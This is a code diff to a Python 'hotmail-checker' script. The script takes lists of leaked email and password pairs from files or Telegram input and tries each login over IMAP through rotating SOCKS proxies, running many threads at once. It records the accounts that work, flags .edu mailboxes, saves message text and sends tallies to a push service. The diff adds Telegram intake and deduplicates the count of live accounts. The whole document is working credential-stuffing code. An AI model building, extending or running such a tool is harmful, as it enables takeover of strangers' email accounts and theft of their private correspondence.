@@ -1,17 +1,19 @@
-import os
-import imaplib
-import yaml
-from hotmail import hotmails
-import random
-import email
-import socket
-import socks
-from datetime import datetime
-from zpush import Push
-from utils import log_message
 import concurrent.futures
+import email
+import imaplib
+import os
+import random
+import socket
+from datetime import datetime
+
+import socks
+import yaml
 from colorama import Fore
 from dateutil.relativedelta import relativedelta
+
+from hotmail import Hotmail
+from utils import log_message, move_files
+from zpush import Push
 
 with open('config/config.yaml', 'r') as file:
     config = yaml.safe_load(file)
@@ -27,7 +29,7 @@ mode = config['checker'].get('mode', 'loose')
 
 
 class EmailChecker:
-    def __init__(self, log_level=1):
+    def __init__(self):
         self.mailboxes = []
         self.proxies = []
         self.start_time = None
@@ -36,8 +38,7 @@ class EmailChecker:
         self.dead_count = 0
         self.edu_count = 0
         self.proxy = False
-        self.log_level = log_level
-        self.load_proxies()
+        self.live_mailboxes = []
 
     @staticmethod
     def load_file(file_path):
@@ -66,6 +67,7 @@ class EmailChecker:
     @staticmethod
     def save_email_content(email_address, from_address, email_message):
         email_filename = f"{save_emails_dir}{email_address.replace('@', '_')}_{from_address.replace('@', '_')}.txt"
+        email_body = ''
         if email_message.is_multipart():
             for part in email_message.walk():
                 if part.get_content_type() == 'text/plain':
@@ -95,10 +97,10 @@ class EmailChecker:
             if self.proxy:
                 address, port, username, password = self.get_random_proxy()
                 if username == 1 and password == 1:
-                    socks.set_default_proxy(socks.SOCKS5, address, port)
+                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, address, port)
                 else:
-                    socks.set_default_proxy(socks.SOCKS5, address, port, username=username, password=password)
-                socks.wrapmodule(imaplib)
+                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, address, port, username=username, password=password)
+                    socket.socket = socks.socksocket
             mail = imaplib.IMAP4_SSL(imap_server, imap_port)
             mail.login(email_address, email_password)
             return mail, None
@@ -177,6 +179,7 @@ class EmailChecker:
             with open(live_emails_dir, 'a') as file:
                 file.write(email_pwd + '\n')
                 log_message(f"{e[0]} : {e[1]} -> Login Success", color=Fore.LIGHTBLUE_EX)
+            self.live_mailboxes.append(email_pwd)
             if self.check_edu_mailbox(e[0], e[1], mail, max_check_time):
                 with open(edu_emails_dir, 'a') as file:
                     file.write(email_pwd + '\n')
@@ -204,7 +207,7 @@ class EmailChecker:
         ratio = self.edu_count / len(self.mailboxes)
         tips = next((tips for threshold, tips in tips_dict.items() if ratio < threshold), tips_dict[0.01])
         stats_message = f"检查了{len(self.mailboxes)}邮箱\n" \
-                        f"{self.live_count} live {self.dead_count} dead \n" \
+                        f"{len(list(set(self.live_mailboxes)))} live {self.dead_count} dead \n" \
                         f"有{self.edu_count} 个edu邮箱 \n" \
                         f"检索了{self.email_count}封邮件 \n" \
                         f"用时{(datetime.now() - self.start_time).total_seconds() / 60} min\n" \
@@ -214,9 +217,19 @@ class EmailChecker:
         push.send_message("hotmail-checker ", stats_message)
 
     def run(self):
-        self.mailboxes = hotmails().get_emails()
+        self.mailboxes = Hotmail().load_local_mailboxes()
         self.start_time = datetime.now()
+        self.load_proxies()
         with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
             list(executor.map(self.check_mailbox, self.mailboxes))
 
         self.collect_and_send_stats()
+
+    def run_with_tg(self, my_email_path):
+        self.mailboxes = Hotmail().load_tg_mailboxes(my_email_path + '/new')
+        move_files(my_email_path + '/new', my_email_path + '/old')
+        self.start_time = datetime.now()
+        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+            list(executor.map(self.check_mailbox, self.mailboxes))
+        self.collect_and_send_stats()
+        return list(set(self.live_mailboxes))
